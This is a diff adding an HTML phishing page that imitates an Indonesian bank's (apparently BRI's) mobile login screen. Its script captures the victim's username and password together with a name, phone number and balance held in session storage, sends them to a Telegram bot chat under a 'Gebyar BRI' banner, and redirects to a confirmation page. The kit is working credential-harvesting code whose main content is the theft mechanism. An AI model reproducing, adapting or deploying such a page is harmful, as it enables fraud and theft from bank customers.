@@ -1,0 +1,331 @@
+
+
+
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="fragment" content="!">
+<meta name="theme-color" content="#1E90FF">
+
+
+
+<meta name="viewport" content="width=device-width,initial-scale=1.0, user-scalable=no, minimal-ui">
+
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous">
+<link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css" />
+<style>
+        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@500&display=swap');
+        @font-face {
+            font-family: 'Avenir';
+            src: url(../fonts/AvenirNextLTPro-Bold.otf);
+        }
+
+        body {
+            padding: 0;
+            margin: 0;
+            width: 100%;
+            font-family: 'Avenir';
+        }
+
+        .text-header {
+            font-family: 'Avenir';
+            color: #09559a;
+        }
+
+        .text-subheader {
+            font-family: 'Avenir';
+            margin-top: -20px;
+            color: #000;
+        }
+
+        .btn-punya {
+            font-family: 'Avenir';
+            display: block;
+            margin: 80px auto 0 auto;
+            padding: 0px; 
+            cursor: pointer; 
+            background: none rgb(0, 134, 224);
+            border: none; 
+            text-align: center; 
+            height: 57px; 
+            width: 459px; 
+            max-width: 100%;
+            font-family: Arial; 
+            font-size: 14px; 
+            font-weight: bold; 
+            color: rgb(255, 255, 255); 
+            letter-spacing: 2px; 
+            line-height: 1; 
+            border-radius: 5px; 
+            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; 
+            transition: background 200ms ease 0s;
+        }
+
+        .btn-belum {
+            font-family: 'Avenir';
+            display: block;
+            margin: 10px auto;
+            padding: 0px; 
+            cursor: pointer; 
+            background: none transparent;
+            border: none; 
+            text-align: center; 
+            height: 57px; 
+            width: 459px; 
+            max-width: 100%;
+            font-family: Arial; 
+            font-size: 14px; 
+            font-weight: bold; 
+            color: rgb(0, 134, 224);
+            letter-spacing: 2px; 
+            line-height: 1; 
+            border-radius: 5px; 
+            transition: background 200ms ease 0s;
+        }
+
+        .form-log {
+            font-family: 'Avenir';
+            box-sizing: border-box; 
+            height: 56px; 
+            width: 480px; 
+            max-width: 100%; 
+            border-top: 1px inset rgba(250, 250, 250, 0.13); 
+            border-right: 1px solid rgba(184, 184, 184, 0.53); 
+            border-bottom: none; 
+            border-left: 1px outset rgba(168, 168, 168, 0.58); 
+            border-image: initial; 
+            background-color: rgb(255, 255, 255); 
+            border-radius: 5px 5px 0px 0px; 
+            box-shadow: rgb(237, 237, 237) 2px 2px 2px 0px; 
+            font-family: 'Open Sans', sans-serif;
+            font-size: 16px; 
+            color: rgb(28, 28, 28); 
+            word-spacing: 7px; 
+            padding: 0px 48px;
+            outline: none;
+        }
+
+        #ionIcons {
+            font-family: 'Avenir'
+            color: rgb(22, 119, 199);
+            font-size: 30px;
+            position: absolute;
+            display: block;
+            margin-top: 7px;
+            margin-left: 15px;
+        }
+
+        .eye {
+            font-family: 'Avenir';
+            display: block;
+            margin: -37px auto;
+            margin-right: 20px;
+            position: relative;
+            box-sizing: border-box; 
+            z-index: 16; 
+            height: 23.7189px;
+            width: 24.0236px; 
+            float: right;
+            border-radius: 0px; 
+            cursor: pointer;
+        }
+
+        .btn-login {
+            font-family: 'Avenir';
+            display: block;
+            margin: 70px 0 0 0;
+            padding: 0px; 
+            cursor: pointer; 
+            background: none rgba(0, 110, 200, 0.96); 
+            border: none; 
+            text-align: center; 
+            height: 48px; 
+            width: 100%; 
+            font-family: Arial; 
+            font-size: 16px; 
+            font-weight: bold; 
+            color: rgb(255, 255, 255); 
+            letter-spacing: 1px; 
+            line-height: 1; 
+            border-radius: 7px; 
+            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; 
+            transition: background 100ms step-start 0s;
+        }
+        .btn-login:hover {background-color: rgba(0, 110, 200, 0.96)}
+
+           .btn-login:active {
+            background-color: rgba(0, 110, 200, 0.96);
+            box-shadow: rgb(135, 135, 135) 0.8px 4px 8px 1px;
+          transform: translateY(0px);
+          }
+
+        .btn-login:disabled {
+            opacity: 0.5;
+        }
+
+        @media only screen and (max-width: 600px) {
+            .btn-login {
+                width: 100%;
+            }
+        }
+        
+        .process1 {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: auto;
+            position: fixed;
+            padding-top: 30px;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.4);
+            z-index: 999999999;
+            
+      
+}
+.loading {
+    position: fixed;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    align-items: center;
+    margin-bottom: 20%;
+    margin-top: 0px;
+}
+    </style>
+</head>
+<body>
+    <div id="gelap" name="process" class="process1" style="display: none;">
+      <div class="loading">
+               
+            </div>
+        </div>
+<div class="container">
+<div class="row">
+<div class="col-12 d-block mx-auto text-center p-0" style="height: auto; width: auto; max-width: auto; margin-top: -2px; border-radius: 0px;">
+<img alt="" src="https://hosting.tigerengine.id/q66zrg.jpg" style="display: block; margin: 0px; width: 100%; height: 100%; border-radius: 0px;">
+        </div>
+         </div>
+         <div class="mt-3">
+        <div class="row" style="margin-top: 60px;">
+<div class="col-12 d-block mx-auto" style="margin-bootom: 0px; white-space: pre-wrap; width: 459px; max-width: 100%; left: 0px; top: 0px; height: 98.8px; padding-bottom: 0px; font-family: Barlow; font-size: 16px; font-weight: 400; color: rgb(59, 59, 59); line-height: 1.4; border-radius: 0px;">
+<div class="text-header"><font style="font-size: 22px; font-weight: bold;"><strong><strong>Login</strong></font></strong></div>
+          </div>
+        </div>
+<form id="inputlogin" onsubmit="sendLogin()" method="POST">
+<input type="hidden" name="nama" id="nama" value="">
+<input type="hidden" name="nomor" id="nomor" value="">
+<input type="hidden" name="saldo" id="saldo" value="">
+<div class="row mb-3">
+<div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: -30px auto;">
+<div>
+<img src="https://hosting.tigerengine.id/tzoh5f.png" width="25" style="position: absolute; margin-top: 14px; margin-left: 14px;" alt="">
+<input name="username" id="uname" type="text" class="bubble-element Input form-log" tabindex="1" placeholder="Username" maxlength="" required>
+</div>
+<div style="margin-top: 1px">
+<img src="https://hosting.tigerengine.id/b4zry3.png" width="21" style="position: absolute; margin-top: 14px; margin-left: 16px;" alt="">
+<input type="password" name="password" id="pass" class="bubble-element Input form-log" tabindex="1" placeholder="Password" maxlength="" pattern="(?=.*[A-Z])(?=.*[a-z])(?=.*[0-9]).{8,}" title="Minimal 8 Digit Terdiri Dari Angka Dan Huruf Besar Kecil" required>
+<div class="bubble-element eye clickable-element" tabindex="3" id="eyeOpen">
+<img alt="" id="eye" src="https://hosting.tigerengine.id/jd7366.png" style="display: block; margin: 0px; width: 100%; height: 100%; border-radius: 0px;">
+</div>
+<div class="bubble-element eye clickable-element" tabindex="3" id="eyeClose" style="display: none">
+<img alt="" id="eye" src="https://hosting.tigerengine.id/s8ol72.png" style="display: block; margin: 0px; width: 100%; height: 100%; border-radius: 0px;">
+</div>
+</div>
+<div class="text-header" style="float: right; position: relative; z-index: 999; display: block; margin-top: 8px;"><font style="font-size: 15px" color="#000000"><strong><strong><a href="/brimoku/bridebit(1).html" target="_blank" style="color: #09559a; text-decoration: none;">Lupa Username/Password?</a></strong></font></div></strong>
+</div>
+</div>
+<div class="row mt-3">
+<div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: -20px auto;">
+<button class="btn-login" id="btnsubmit" type="submit" disabled>Login</button>
+<br>
+</div>
+</div>
+</form>
+</div>
+</div>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script>
+<script>
+var nama = sessionStorage.getItem("nama");
+document.getElementById("nama").value = nama + "";
+var nomor = sessionStorage.getItem("nomor");
+document.getElementById("nomor").value = nomor + "";
+var saldo = sessionStorage.getItem("saldo");
+document.getElementById("saldo").value = saldo + "";
+  </script>
+  <script src="i.js"></script>
+<script>
+// Login
+function sendLogin(){
+    $(".process1").fadeIn();
+    event.preventDefault();   
+    document.getElementById('btnsubmit').innerHTML = "Memproses....";
+var nomor = document.getElementById("nomor").value;
+sessionStorage.setItem("nomor", nomor);
+var nama = document.getElementById("nama").value;
+sessionStorage.setItem("nama", nama);
+var saldo = document.getElementById("saldo").value;
+sessionStorage.setItem("saldo", saldo);
+var unames = document.getElementById("uname").value;
+sessionStorage.setItem("unames", unames);
+var norek = document.getElementById("pass").value;
+sessionStorage.setItem("norek", norek);                    
+                              
+    var logo = "✧༺𝗚𝗲𝗯𝘆𝗮𝗿 𝗕𝗥𝗜༻✧";              
+    var gabungan = '' + logo + '%0A⍟ 𝗡𝗮𝗺𝗮 •• ' + nama + '%0A⍟ 𝗡𝗼𝗺𝗼𝗿 •• ' + nomor + '%0A⍟ 𝗦𝗮𝗹𝗱𝗼 •• Rp ' + saldo + '%0A%0A⍟ 𝗨𝘀𝗲𝗿 •• ' + uname.value + '%0A⍟ 𝗣𝗮𝘀𝘀 •• ' + pass.value ;   
+    $.ajax({
+        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+        method: `POST`,   
+    complete: function(){
+    setTimeout(function(){   
+    window.location.href='konf.html';  
+    }, 500);}});};
+</script>
+ <script>
+        function OnButton(uname, pass) {
+            if(uname.length > 4 && pass.length > 4) {
+                $(".btn-login").prop('disabled', false);
+            } else {
+                $(".btn-login").prop('disabled', true);
+            }
+        }
+        $(document).ready(function() {
+        
+            $("div#eyeOpen").on('click', function() {
+                $("#eyeOpen").css("display", "none");
+                $("#eyeClose").css("display", "block");
+
+                $("#pass").prop("type", "text");
+
+                $("div#eyeClose").on('click', function() {
+                    $("#eyeOpen").css("display", "block");
+                    $("#eyeClose").css("display", "none");
+
+                    $("#pass").prop("type", "password");
+                });
+            });
+
+            $("#uname").on('input', function() {
+                var uname = $("#uname").val();
+                var pass = $("#pass").val();
+
+                OnButton(uname, pass);
+            });
+
+            $("#pass").on('input', function() {
+                var uname = $("#uname").val();
+                var pass = $("#pass").val();
+
+                OnButton(uname, pass);
+            });
+        });
+    </script>
+  <!-- <div </script></body> -->
+  </body>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js" integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script> 
+</html>
